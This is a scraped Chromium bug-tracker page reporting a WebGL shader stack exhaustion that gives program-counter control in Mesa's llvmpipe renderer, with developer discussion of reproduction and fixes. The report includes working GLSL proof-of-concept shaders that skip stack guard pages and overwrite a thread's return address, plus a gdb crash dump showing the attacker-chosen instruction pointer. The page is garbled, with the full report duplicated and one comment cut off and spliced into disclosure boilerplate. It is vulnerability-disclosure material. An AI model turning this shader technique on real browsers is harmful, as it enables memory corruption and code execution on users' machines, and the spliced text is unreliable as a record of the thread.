?? ()<!----></span><br>gdb-peda$ bt<span class="line"><!---->gdb-peda$ bt<!----></span><br><br>```<span class="line"><!---->```<!----></span><br><br># Bug<span class="line"><!----># Bug<!----></span><br><br>We can define arrays inside a shader and make them quite large.<span class="line"><!---->We can define arrays inside a shader and make them quite large.<!----></span><br>Those are allocated on the stack, regardless of the stack size of the computing engine.<span class="line"><!---->Those are allocated on the stack, regardless of the stack size of the computing engine.<!----></span><br>Therefore, we have a giant "sub $rsp, xxx" in the beginning of the shader function.<span class="line"><!---->Therefore, we have a giant "sub $rsp, xxx" in the beginning of the shader function.<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>    precision mediump float;<span class="line"><!---->    precision mediump float;<!----></span><br>    vec4 x[42000000]; //Allocate lots of memory<span class="line"><!---->    vec4 x[42000000]; //Allocate lots of memory<!----></span><br>    int i;<span class="line"><!---->    int i;<!----></span><br><br>    varying vec4 vColor;<span class="line"><!---->    varying vec4 vColor;<!----></span><br>    void main(void) {<span class="line"><!---->    void main(void) {<!----></span><br>        gl_FragColor = x[42]; //used so x is not optimized out<span class="line"><!---->        gl_FragColor = x[42]; //used so x is not optimized out<!----></span><br>    }<span class="line"><!---->    }<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>The shader language has some important limitations:<span class="line"><!---->The shader language has some important limitations:<!----></span><br> - Recursive shader functions are not allowed.<span class="line"><!----> - Recursive shader functions are not allowed.<!----></span><br> - Array indices must be constant.<span class="line"><!----> - Array indices must be constant.<!----></span><br> - Small arrays (<16 elements or so) might be optimized out.<span class="line"><!----> - Small arrays (&lt;16 elements or so) might be optimized out.<!----></span><br> - Functions, that are called once will be inlined<span class="line"><!----> - Functions, that are called once will be inlined<!----></span><br> - Everything, that is not needed is optimized out.<span class="line"><!----> - Everything, that is not needed is optimized out.<!----></span><br><br>Shaderlanguage is defined [here](<span class="line"><!---->Shaderlanguage is defined [here](<!----></span>https://www.khronos.org/registry/OpenGL/specs/gl/GLSLangSpec.4.10.pdf<a class="undefined" target="_blank" href="https://www.khronos.org/registry/OpenGL/specs/gl/GLSLangSpec.4.10.pdf"><!---->https://www.khronos.org/registry/OpenGL/specs/gl/GLSLangSpec.4.10.pdf<!----></a>)<span class="line"><!---->)<!----></span><br><br><br># llvmpipe<span class="line"><!----># llvmpipe<!----></span><br><br>The LLVM Pipe driver is used on Linux if no graphics card is available and is part of mesa.<span class="line"><!---->The LLVM Pipe driver is used on Linux if no graphics card is available and is part of mesa.<!----></span><br>TLDR: We have PC control but no leak<span class="line"><!---->TLDR: We have PC control but no leak<!----></span><br><br>Each core has its own thread for executing shaders.<span class="line"><!---->Each core has its own thread for executing shaders.<!----></span><br>Triggereing the bug here allows us to jump into the stack frame of the next process.<span class="line"><!---->Triggereing the bug here allows us to jump into the stack frame of the next process.<!----></span><br>Stacks are separated with guard pages, a 4096 byte region, that is not readable, writable or executable.<span class="line"><!---->Stacks are separated with guard pages, a 4096 byte region, that is not readable, writable or executable.<!----></span><br>Those can be skipped usig the following code:<span class="line"><!---->Those can be skipped usig the following code:<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>int x[0x00080];<span class="line"><!---->int x[0x00080];<!----></span><br>void main(void) {<span class="line"><!---->void main(void) {<!----></span><br>  gl_FragColor = vec4(float(x[0]); //required so x is not optimzed out<span class="line"><!---->  gl_FragColor = vec4(float(x[0]); //required so x is not optimzed out<!----></span><br><br>  // Here we allocate memory, without writing to it<span class="line"><!---->  // Here we allocate memory, without writing to it<!----></span><br>  if (int(x[0]) == 42) {<span class="line"><!---->  if (int(x[0]) == 42) {<!----></span><br>    int pad[0x40000];<span class="line"><!---->    int pad[0x40000];<!----></span><br>    gl_FragColor += vec4(float(pad[42]));<span class="line"><!---->    gl_FragColor += vec4(float(pad[42]));<!----></span><br>  }<span class="line"><!---->  }<!----></span><br>}<span class="line"><!---->}<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>This will translate to the following code:<span class="line"><!---->This will translate to the following code:<!----></span><br><br><br>```<span class="line"><!---->```<!----></span><br>void initGlobals();<span class="line"><!---->void initGlobals();<!----></span><br>varying mediump float webgl_51cdbba1f77a8b72;<span class="line"><!---->varying mediump float webgl_51cdbba1f77a8b72;<!----></span><br>mediump int webgl_4fc82888d13de398[128];<span class="line"><!---->mediump int webgl_4fc82888d13de398[128];<!----></span><br>void main(){<span class="line"><!---->void main(){<!----></span><br>    initGlobals();<span class="line"><!---->    initGlobals();<!----></span><br>    (gl_FragColor = vec4(float(webgl_4fc82888d13de398[0])));<span class="line"><!---->    (gl_FragColor = vec4(float(webgl_4fc82888d13de398[0])));<!----></span><br><br>    if ((int(webgl_4fc82888d13de398[0]) == 42)) {<span class="line"><!---->    if ((int(webgl_4fc82888d13de398[0]) == 42)) {<!----></span><br>        mediump int webgl_b84b23e845ea3eb[262144];<span class="line"><!---->        mediump int webgl_b84b23e845ea3eb[262144];<!----></span><br>        for (highp int s920 = 0; (s920 < 262144); (++s920)) {<span class="line"><!---->        for (highp int s920 = 0; (s920 &lt; 262144); (++s920)) {<!----></span><br>            (webgl_b84b23e845ea3eb[s920] = 0);<span class="line"><!---->            (webgl_b84b23e845ea3eb[s920] = 0);<!----></span><br>        }<span class="line"><!---->        }<!----></span><br>        (gl_FragColor += vec4(float(webgl_b84b23e845ea3eb[42])));<span class="line"><!---->        (gl_FragColor += vec4(float(webgl_b84b23e845ea3eb[42])));<!----></span><br>    }<span class="line"><!---->    }<!----></span><br>}<span class="line"><!---->}<!----></span><br>void initGlobals(){<span class="line"><!---->void initGlobals(){<!----></span><br>    for (highp int s91e = 0; (s91e < 128); (++s91e)) {<span class="line"><!---->    for (highp int s91e = 0; (s91e &lt; 128); (++s91e)) {<!----></span><br>        (webgl_4fc82888d13de398[s91e] = 0);<span class="line"><!---->        (webgl_4fc82888d13de398[s91e] = 0);<!----></span><br>    }<span class="line"><!---->    }<!----></span><br>}<span class="line"><!---->}<!----></span><br><br>```<span class="line"><!---->```<!----></span><br><br>Not that pad is declared and initialized within the consequent of the if statement.<span class="line"><!---->Not that pad is declared and initialized within the consequent of the if statement.<!----></span><br>As the expression is always false, the initialization is never executed.<span class="line"><!---->As the expression is always false, the initialization is never executed.<!----></span><br>However the stack frame is allocated on function entry and not modified within a code block.<span class="line"><!---->However the stack frame is allocated on function entry and not modified within a code block.<!----></span><br>Therefore, we can allocate memory without writing to it and skip guard pages.<span class="line"><!---->Therefore, we can allocate memory without writing to it and skip guard pages.<!----></span><br><br><br>By tuning the offsets, we an directly overwrite the return address of a llvmpipe thread.<span class="line"><!---->By tuning the offsets, we an directly overwrite the return address of a llvmpipe thread.<!----></span><br>One thing to note is, that 8 pixels are computed per thread.<span class="line"><!---->One thing to note is, that 8 pixels are computed per thread.<!----></span><br>Therefore allocates each 32-bit int 32 bytes in memory.<span class="line"><!---->Therefore allocates each 32-bit int 32 bytes in memory.<!----></span><br>To control the upper and lower half of a 64-bit address, we have to put different values insinde the array for two pixels.<span class="line"><!---->To control the upper and lower half of a 64-bit address, we have to put different values insinde the array for two pixels.<!----></span><br>One way to accomplish this is to use varying variables.<span class="line"><!---->One way to accomplish this is to use varying variables.<!----></span><br><br><br>```<span class="line"><!---->```<!----></span><br>varying float floatVar;<span class="line"><!---->varying float floatVar;<!----></span><br><br>[...]<span class="line"><!---->[...]<!----></span><br>    if(floatVar > 0.) <span class="line"><!---->    if(floatVar &gt; 0.) <!----></span><br>      x[0x1a] = 0x4344;<span class="line"><!---->      x[0x1a] = 0x4344;<!----></span><br>    else<span class="line"><!---->    else<!----></span><br>      x[0x1a] = 0x45464748;<span class="line"><!---->      x[0x1a] = 0x45464748;<!----></span><br><br>```<span class="line"><!---->```<!----></span><br><br>There are no stack-canaries within the llvmpipe threads<span class="line"><!---->There are no stack-canaries within the llvmpipe threads<!----></span><br><br># Leak<span class="line"><!----># Leak<!----></span><br><br>I do not see a trivial way to convert this bug into a leak right now.<span class="line"><!---->I do not see a trivial way to convert this bug into a leak right now.<!----></span><br>As we want to leak pointers, we also have the chance of overwriting them, resulting in a crash.<span class="line"><!---->As we want to leak pointers, we also have the chance of overwriting them, resulting in a crash.<!----></span><br>This makes exploitation possibly unreliable.<span class="line"><!---->This makes exploitation possibly unreliable.<!----></span><mr-comment-content></mr-comment-content>

        Hi,<span class="line"><!---->Hi,<!----></span><br>I saw that clusterfuzz failed to reproduce the testcase. It seems that swift shader is used instead of llvmpipe due to the added option ``--use-gl=angle --use-angle=swiftshader``. The google swift shader is not affected and the compilation of the buggy shader is fails with ``Array size of (xxx) exceeds limit of gl_MaxFragmentUniformVectors(261)``. The msan build still uses Swift and not llvmpipe per default even with with ``--use-gl=angle --use-angle=llvmpipe``. chrome://gpu still says ``Google Swift Shader`` as ``GL_Renderer`` and not ``Angle (xxx)``.<span class="line"><!---->I saw that clusterfuzz failed to reproduce the testcase. It seems that swift shader is used instead of llvmpipe due to the added option ``--use-gl=angle --use-angle=swiftshader``. The google swift shader is not affected and the compilation of the buggy shader is fails with ``Array size of (xxx) exceeds limit of gl_MaxFragmentUniformVectors(261)``. The msan build still uses Swift and not llvmpipe per default even with with ``--use-gl=angle --use-angle=llvmpipe``. chrome://gpu still says ``Google Swift Shader`` as ``GL_Renderer`` and not ``Angle (xxx)``.<!----></span><br><br>An other common ground I could identify is:<span class="line"><!---->An other common ground I could identify is:<!----></span><br>Affected: GL_VERSION = OpenGL ES x.y.z<span class="line"><!---->Affected: GL_VERSION = OpenGL ES x.y.z<!----></span><br>Not Affected: GL_VERSION = OpenGL ES x.y.z SwiftShader a.b.c<span class="line"><!---->Not Affected: GL_VERSION = OpenGL ES x.y.z SwiftShader a.b.c<!----></span><br><br>On a Pixel4 with Android 11 the shader also compiles indicating a missing check. However the bug triggers on the GPU leading to strange behavior (In some cases system UI freeze/crash) and no PC control.<span class="line"><!---->On a Pixel4 with Android 11 the shader also compiles indicating a missing check. However the bug triggers on the GPU leading to strange behavior (In some cases system UI freeze/crash) and no PC control.<!----></span><br><br>If this bug is not within the chrome project and can pinpoint the affected project please let me know.<span class="line"><!---->If this bug is not within the chrome project and can pinpoint the affected project please let me know.<!----></span><br><br>[1] <span class="line"><!---->[1] <!----></span>https://www.googleapis.com/download/storage/v1/b/chromium-browser-msan/o/linux-release%2Fmsan-chained-origins-linux-release-834666.zip?generation=1607429425401070&alt=media<a class="undefined" target="_blank" href="https://www.googleapis.com/download/storage/v1/b/chromium-browser-msan/o/linux-release%2Fmsan-chained-origins-linux-release-834666.zip?generation=1607429425401070&amp;alt=media"><!---->https://www.googleapis.com/download/storage/v1/b/chromium-browser-msan/o/linux-release%2Fmsan-chained-origins-linux-release-834666.zip?generation=1607429425401070&amp;alt=media<!----></a><mr-comment-content></mr-comment-content>

          <a class="comment-link" href="?id=1155974#c8">Comment 8<!----></a>

          
        by

        Any system with Mesa (i.e. pretty much all Linux systems) should have llvmpipe available as a fallback. A quick search shows that the way to do this nowadays is to set:<span class="line"><!---->Any system with Mesa (i.e. pretty much all Linux systems) should have llvmpipe available as a fallback. A quick search shows that the way to do this nowadays is to set:<!----></span><br><br>LIBGL_ALWAYS_SOFTWARE=1<span class="line"><!---->LIBGL_ALWAYS_SOFTWARE=1<!----></span><br>GALLIUM_DRIVER=llvmpipe<span class="line"><!---->GALLIUM_DRIVER=llvmpipe<!----></span><br><br>https://docs.mesa3d.org/envvars.html<a class="undefined" target="_blank" href="https://docs.mesa3d.org/envvars.html"><!---->https://docs.mesa3d.org/envvars.html<!----></a><br>(I seem to remember it used to be a bit harder, had to set some LD variables, but that probably isn't necessary anymore.)<span class="line"><!---->(I seem to remember it used to be a bit harder, had to set some LD variables, but that probably isn't necessary anymore.)<!----></span><br><br>In Chromium you might also need --ignore-gpu-blocklist if Chromium blocklists llvmpipe. I'm not sure whether we do - on a cursory inspection, I only see an entry for a very old version of Mesa, so we may not blocklist it.<span class="line"><!---->In Chromium you might also need --ignore-gpu-blocklist if Chromium blocklists llvmpipe. I'm not sure whether we do - on a cursory inspection, I only see an entry for a very old version of Mesa, so we may not blocklist it.<!----></span><br>https://source.chromium.org/chromium/chromium/src/+/master:gpu/config/software_rendering_list.json<a class="undefined" target="_blank" href="https://source.chromium.org/chromium/chromium/src/+/master:gpu/config/software_rendering_list.json"><!---->https://source.chromium.org/chromium/chromium/src/+/master:gpu/config/software_rendering_list.json<!----></a><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>

        <div>
          <a class="comment-link" href="?id=1155974#c9">Comment 9<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Tue, Dec 8, 2020, 6:12 PM EST"></chops-timestamp>
        
      
        </div>
        
      <div role="heading" class="comment-header" aria-level="2">
        <div>
          <a class="comment-link" href="?id=1155974#c9">Comment 9<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Tue, Dec 8, 2020, 6:12 PM EST"></chops-timestamp>
        
      
        </div>
        
      </div>
    
      
        
        
      
        > The msan build still uses Swift and not llvmpipe per default even with with ``--use-gl=angle --use-angle=llvmpipe``. chrome://gpu still says ``Google Swift Shader`` as ``GL_Renderer`` and not ``Angle (xxx)``.<span class="line"><!---->&gt; The msan build still uses Swift and not llvmpipe per default even with with ``--use-gl=angle --use-angle=llvmpipe``. chrome://gpu still says ``Google Swift Shader`` as ``GL_Renderer`` and not ``Angle (xxx)``.<!----></span><br><br>llvmpipe is not an ANGLE backend, so you can't do --use-angle=llvmpipe. llvmpipe is part of Mesa, which is system software.<span class="line"><!---->llvmpipe is not an ANGLE backend, so you can't do --use-angle=llvmpipe. llvmpipe is part of Mesa, which is system software.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>

        kbr: Do you think we should add llvmpipe to our software rendering list if it's not already there? I would have thought we already blocked llvmpipe since I think we block other software renderers (and rely on our own software paths + swiftshader). That would resolve this issue on chrome's side without blocking on a Mesa fix.<span class="line"><!---->kbr: Do you think we should add llvmpipe to our software rendering list if it's not already there? I would have thought we already blocked llvmpipe since I think we block other software renderers (and rely on our own software paths + swiftshader). That would resolve this issue on chrome's side without blocking on a Mesa fix.<!----></span><mr-comment-content></mr-comment-content>

        kainino: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?<span class="line"><!---->kainino: Uh oh! This issue still open and hasn't been updated in the last 14 days. accurate<!----></span><br>(SVGA3D is virtualized over hardware; it's not a software renderer).<span class="line"><!---->(SVGA3D is virtualized over hardware; it's not a software         *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users.       </div><br>
    
        
      
        Approving merge to M88, branch 4324, assuming no problems have been reported against dev.       # WebGL Shader Stack Exhaustion leading to PC control in llvmpipe<span class="line"><!----># WebGL Shader Stack Exhaustion leading to PC control in llvmpipe<!----></span><br><br>There seem to be a stack exhaustion in ANGLE - Almost Native Graphics Layer Engine.<span class="line"><!---->There seem to be a stack exhaustion in ANGLE - Almost Native Graphics Layer Engine.<!----></span><br>This triggers on the GPU or the CPU if llvmpipe is used.<span class="line"><!---->This triggers on the GPU or the CPU if llvmpipe is used.<!----></span><br># Poc<span class="line"><!----># Poc<!----></span><br><br>See `llvmpipe.ubuntu20.04.write.pc.html`. This has been on a Ubtuntu 20.04 in Virtual Box<span class="line"><!---->See `llvmpipe.ubuntu20.04.write.pc.html`. This has been on a Ubtuntu 20.04 in Virtual Box<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>Renderer: ANGLE (VMware, Inc., llvmpipe (LLVM 10.0.0, 256 bits), OpenGL 3.3 core)<span class="line"><!---->Renderer: ANGLE (VMware, Inc., llvmpipe (LLVM 10.0.0, 256 bits), OpenGL 3.3 core)<!----></span><br>Chromium Version: Chromium 87.0.4280.66 snap<span class="line"><!---->Chromium Version: Chromium 87.0.4280.66 snap<!----></span><br>Type of crash: gpu process<span class="line"><!---->Type of crash: gpu process<!----></span><br><br>Crash State:<span class="line"><!---->Crash State:<!----></span><br><br>Thread 3 "llvmpipe-1" received signal SIGSEGV, Segmentation fault.<span class="line"><!---->Thread 3 "llvmpipe-1" received signal SIGSEGV, Segmentation fault.<!----></span><br>[Switching to LWP 2897]<span class="line"><!---->[Switching to LWP 2897]<!----></span><br>[----------------------------------registers-----------------------------------]<span class="line"><!---->[----------------------------------registers-----------------------------------]<!----></span><br>RAX: 0x0 <span class="line"><!---->RAX: 0x0 <!----></span><br>RBX: 0x1800000018 <span class="line"><!---->RBX: 0x1800000018 <!----></span><br>RCX: 0x7fd6624b0e5e (<pthread_barrier_wait+286>:	cmp    rax,0xfffffffffffff000)<span class="line"><!---->RCX: 0x7fd6624b0e5e (&lt;pthread_barrier_wait+286&gt;:	cmp    rax,0xfffffffffffff000)<!----></span><br>RDX: 0x1 <span class="line"><!---->RDX: 0x1 <!----></span><br>RSI: 0x80 <span class="line"><!---->RSI: 0x80 <!----></span><br>RDI: 0x561839f96884 --> 0x4000003cc <span class="line"><!---->RDI: 0x561839f96884 --&gt; 0x4000003cc <!----></span><br>RBP: 0x1900000019 <span class="line"><!---->RBP: 0x1900000019 <!----></span><br>RSP: 0x7fd644229a90 --> 0x434400004344 ('DC')<span class="line"><!---->RSP: 0x7fd644229a90 --&gt; 0x434400004344 ('DC')<!----></span><br>RIP: 0x434445464748 ('HGFEDC')<span class="line"><!---->RIP: 0x434445464748 ('HGFEDC')<!----></span><br>R8 : 0x3c9 <span class="line"><!---->R8 : 0x3c9 <!----></span><br>R9 : 0x561839f96880 --> 0x3cc000003cf <span class="line"><!---->R9 : 0x561839f96880 --&gt; 0x3cc000003cf <!----></span><br>R10: 0x0 <span class="line"><!---->R10: 0x0 <!----></span><br>R11: 0x282 <span class="line"><!---->R11: 0x282 <!----></span><br>R12: 0x1900000019 <span class="line"><!---->R12: 0x1900000019 <!----></span><br>R13: 0x1900000019 <span class="line"><!---->R13: 0x1900000019 <!----></span><br>R14: 0x1900000019 <span class="line"><!---->R14: 0x1900000019 <!----></span><br>R15: 0x434445464748 ('HGFEDC')<span class="line"><!---->R15: 0x434445464748 ('HGFEDC')<!----></span><br>EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)<span class="line"><!---->EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)<!----></span><br>[-------------------------------------code-------------------------------------]<span class="line"><!---->[-------------------------------------code-------------------------------------]<!----></span><br>Invalid $PC address: 0x434445464748<span class="line"><!---->Invalid $PC address: 0x434445464748<!----></span><br>[------------------------------------stack-------------------------------------]<span class="line"><!---->[------------------------------------stack-------------------------------------]<!----></span><br>0000| 0x7fd644229a90 --> 0x434400004344 ('DC')<span class="line"><!---->0000| 0x7fd644229a90 --&gt; 0x434400004344 ('DC')<!----></span><br>0008| 0x7fd644229a98 --> 0x434400004344 ('DC')<span class="line"><!---->0008| 0x7fd644229a98 --&gt; 0x434400004344 ('DC')<!----></span><br>0016| 0x7fd644229aa0 --> 0x1b0000001b <span class="line"><!---->0016| 0x7fd644229aa0 --&gt; 0x1b0000001b <!----></span><br>0024| 0x7fd644229aa8 --> 0x1b0000001b <span class="line"><!---->0024| 0x7fd644229aa8 --&gt; 0x1b0000001b <!----></span><br>0032| 0x7fd644229ab0 --> 0x1b0000001b <span class="line"><!---->0032| 0x7fd644229ab0 --&gt; 0x1b0000001b <!----></span><br>0040| 0x7fd644229ab8 --> 0x1b0000001b <span class="line"><!---->0040| 0x7fd644229ab8 --&gt; 0x1b0000001b <!----></span><br>0048| 0x7fd644229ac0 --> 0x1c0000001c <span class="line"><!---->0048| 0x7fd644229ac0 --&gt; 0x1c0000001c <!----></span><br>0056| 0x7fd644229ac8 --> 0x1c0000001c <span class="line"><!---->0056| 0x7fd644229ac8 --&gt; 0x1c0000001c <!----></span><br>[------------------------------------------------------------------------------]<span class="line"><!---->[------------------------------------------------------------------------------]<!----></span><br>Legend: code, data, rodata, value<span class="line"><!---->Legend: code, data, rodata, value<!----></span><br>Stopped reason: SIGSEGV<span class="line"><!---->Stopped reason: SIGSEGV<!----></span><br>0x0000434445464748 in ?? ()<span class="line"><!---->0x0000434445464748 in ?? ()<!----></span><br>gdb-peda$ bt<span class="line"><!---->gdb-peda$ bt<!----></span><br><br>```<span class="line"><!---->```<!----></span><br><br># Bug<span class="line"><!----># Bug<!----></span><br><br>We can define arrays inside a shader and make them quite large.<span class="line"><!---->We can define arrays inside a shader and make them quite large.<!----></span><br>Those are allocated on the stack, regardless of the stack size of the computing engine.<span class="line"><!---->Those are allocated on the stack, regardless of the stack size of the computing engine.<!----></span><br>Therefore, we have a giant "sub $rsp, xxx" in the beginning of the shader function.<span class="line"><!---->Therefore, we have a giant "sub $rsp, xxx" in the beginning of the shader function.<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>    precision mediump float;<span class="line"><!---->    precision mediump float;<!----></span><br>    vec4 x[42000000]; //Allocate lots of memory<span class="line"><!---->    vec4 x[42000000]; //Allocate lots of memory<!----></span><br>    int i;<span class="line"><!---->    int i;<!----></span><br><br>    varying vec4 vColor;<span class="line"><!---->    varying vec4 vColor;<!----></span><br>    void main(void) {<span class="line"><!---->    void main(void) {<!----></span><br>        gl_FragColor = x[42]; //used so x is not optimized out<span class="line"><!---->        gl_FragColor = x[42]; //used so x is not optimized out<!----></span><br>    }<span class="line"><!---->    }<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>The shader language has some important limitations:<span class="line"><!---->The shader language has some important limitations:<!----></span><br> - Recursive shader functions are not allowed.<span class="line"><!----> - Recursive shader functions are not allowed.<!----></span><br> - Array indices must be constant.<span class="line"><!----> - Array indices must be constant.<!----></span><br> - Small arrays (<16 elements or so) might be optimized out.<span class="line"><!----> - Small arrays (&lt;16 elements or so) might be optimized out.<!----></span><br> - Functions, that are called once will be inlined<span class="line"><!----> - Functions, that are called once will be inlined<!----></span><br> - Everything, that is not needed is optimized out.<span class="line"><!----> - Everything, that is not needed is optimized out.<!----></span><br><br>Shaderlanguage is defined [here](<span class="line"><!---->Shaderlanguage is defined [here](<!----></span>https://www.khronos.org/registry/OpenGL/specs/gl/GLSLangSpec.4.10.pdf<a class="undefined" target="_blank" href="https://www.khronos.org/registry/OpenGL/specs/gl/GLSLangSpec.4.10.pdf"><!---->https://www.khronos.org/registry/OpenGL/specs/gl/GLSLangSpec.4.10.pdf<!----></a>)<span class="line"><!---->)<!----></span><br><br><br># llvmpipe<span class="line"><!----># llvmpipe<!----></span><br><br>The LLVM Pipe driver is used on Linux if no graphics card is available and is part of mesa.<span class="line"><!---->The LLVM Pipe driver is used on Linux if no graphics card is available and is part of mesa.<!----></span><br>TLDR: We have PC control but no leak<span class="line"><!---->TLDR: We have PC control but no leak<!----></span><br><br>Each core has its own thread for executing shaders.<span class="line"><!---->Each core has its own thread for executing shaders.<!----></span><br>Triggereing the bug here allows us to jump into the stack frame of the next process.<span class="line"><!---->Triggereing the bug here allows us to jump into the stack frame of the next process.<!----></span><br>Stacks are separated with guard pages, a 4096 byte region, that is not readable, writable or executable.<span class="line"><!---->Stacks are separated with guard pages, a 4096 byte region, that is not readable, writable or executable.<!----></span><br>Those can be skipped usig the following code:<span class="line"><!---->Those can be skipped usig the following code:<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>int x[0x00080];<span class="line"><!---->int x[0x00080];<!----></span><br>void main(void) {<span class="line"><!---->void main(void) {<!----></span><br>  gl_FragColor = vec4(float(x[0]); //required so x is not optimzed out<span class="line"><!---->  gl_FragColor = vec4(float(x[0]); //required so x is not optimzed out<!----></span><br><br>  // Here we allocate memory, without writing to it<span class="line"><!---->  // Here we allocate memory, without writing to it<!----></span><br>  if (int(x[0]) == 42) {<span class="line"><!---->  if (int(x[0]) == 42) {<!----></span><br>    int pad[0x40000];<span class="line"><!---->    int pad[0x40000];<!----></span><br>    gl_FragColor += vec4(float(pad[42]));<span class="line"><!---->    gl_FragColor += vec4(float(pad[42]));<!----></span><br>  }<span class="line"><!---->  }<!----></span><br>}<span class="line"><!---->}<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>This will translate to the following code:<span class="line"><!---->This will translate to the following code:<!----></span><br><br><br>```<span class="line"><!---->```<!----></span><br>void initGlobals();<span class="line"><!---->void initGlobals();<!----></span><br>varying mediump float webgl_51cdbba1f77a8b72;<span class="line"><!---->varying mediump float webgl_51cdbba1f77a8b72;<!----></span><br>mediump int webgl_4fc82888d13de398[128];<span class="line"><!---->mediump int webgl_4fc82888d13de398[128];<!----></span><br>void main(){<span class="line"><!---->void main(){<!----></span><br>    initGlobals();<span class="line"><!---->    initGlobals();<!----></span><br>    (gl_FragColor = vec4(float(webgl_4fc82888d13de398[0])));<span class="line"><!---->    (gl_FragColor = vec4(float(webgl_4fc82888d13de398[0])));<!----></span><br><br>    if ((int(webgl_4fc82888d13de398[0]) == 42)) {<span class="line"><!---->    if ((int(webgl_4fc82888d13de398[0]) == 42)) {<!----></span><br>        mediump int webgl_b84b23e845ea3eb[262144];<span class="line"><!---->        mediump int webgl_b84b23e845ea3eb[262144];<!----></span><br>        for (highp int s920 = 0; (s920 < 262144); (++s920)) {<span class="line"><!---->        for (highp int s920 = 0; (s920 &lt; 262144); (++s920)) {<!----></span><br>            (webgl_b84b23e845ea3eb[s920] = 0);<span class="line"><!---->            (webgl_b84b23e845ea3eb[s920] = 0);<!----></span><br>        }<span class="line"><!---->        }<!----></span><br>        (gl_FragColor += vec4(float(webgl_b84b23e845ea3eb[42])));<span class="line"><!---->        (gl_FragColor += vec4(float(webgl_b84b23e845ea3eb[42])));<!----></span><br>    }<span class="line"><!---->    }<!----></span><br>}<span class="line"><!---->}<!----></span><br>void initGlobals(){<span class="line"><!---->void initGlobals(){<!----></span><br>    for (highp int s91e = 0; (s91e < 128); (++s91e)) {<span class="line"><!---->    for (highp int s91e = 0; (s91e &lt; 128); (++s91e)) {<!----></span><br>        (webgl_4fc82888d13de398[s91e] = 0);<span class="line"><!---->        (webgl_4fc82888d13de398[s91e] = 0);<!----></span><br>    }<span class="line"><!---->    }<!----></span><br>}<span class="line"><!---->}<!----></span><br><br>```<span class="line"><!---->```<!----></span><br><br>Not that pad is declared and initialized within the consequent of the if statement.<span class="line"><!---->Not that pad is declared and initialized within the consequent of the if statement.<!----></span><br>As the expression is always false, the initialization is never executed.<span class="line"><!---->As the expression is always false, the initialization is never executed.<!----></span><br>However the stack frame is allocated on function entry and not modified within a code block.<span class="line"><!---->However the stack frame is allocated on function entry and not modified within a code block.<!----></span><br>Therefore, we can allocate memory without writing to it and skip guard pages.<span class="line"><!---->Therefore, we can allocate memory without writing to it and skip guard pages.<!----></span><br><br><br>By tuning the offsets, we an directly overwrite the return address of a llvmpipe thread.<span class="line"><!---->By tuning the offsets, we an directly overwrite the return address of a llvmpipe thread.<!----></span><br>One thing to note is, that 8 pixels are computed per thread.<span class="line"><!---->One thing to note is, that 8 pixels are computed per thread.<!----></span><br>Therefore allocates each 32-bit int 32 bytes in memory.<span class="line"><!---->Therefore allocates each 32-bit int 32 bytes in memory.<!----></span><br>To control the upper and lower half of a 64-bit address, we have to put different values insinde the array for two pixels.<span class="line"><!---->To control the upper and lower half of a 64-bit address, we have to put different values insinde the array for two pixels.<!----></span><br>One way to accomplish this is to use varying variables.<span class="line"><!---->One way to accomplish this is to use varying variables.<!----></span><br><br><br>```<span class="line"><!---->```<!----></span><br>varying float floatVar;<span class="line"><!---->varying float floatVar;<!----></span><br><br>[...]<span class="line"><!---->[...]<!----></span><br>    if(floatVar > 0.) <span class="line"><!---->    if(floatVar &gt; 0.) <!----></span><br>      x[0x1a] = 0x4344;<span class="line"><!---->      x[0x1a] = 0x4344;<!----></span><br>    else<span class="line"><!---->    else<!----></span><br>      x[0x1a] = 0x45464748;<span class="line"><!---->      x[0x1a] = 0x45464748;<!----></span><br><br>```<span class="line"><!---->```<!----></span><br><br>There are no stack-canaries within the llvmpipe threads<span class="line"><!---->There are no stack-canaries within the llvmpipe threads<!----></span><br><br># Leak<span class="line"><!----># Leak<!----></span><br><br>I do not see a trivial way to convert this bug into a leak right now.<span class="line"><!---->I do not see a trivial way to convert this bug into a leak right now.<!----></span><br>As we want to leak pointers, we also have the chance of overwriting them, resulting in a crash.<span class="line"><!---->As we want to leak pointers, we also have the chance of overwriting them, resulting in a crash.<!----></span><br>This makes exploitation possibly unreliable.<span class="line"><!---->This makes exploitation possibly unreliable.<!----></span><mr-comment-content></mr-comment-content>

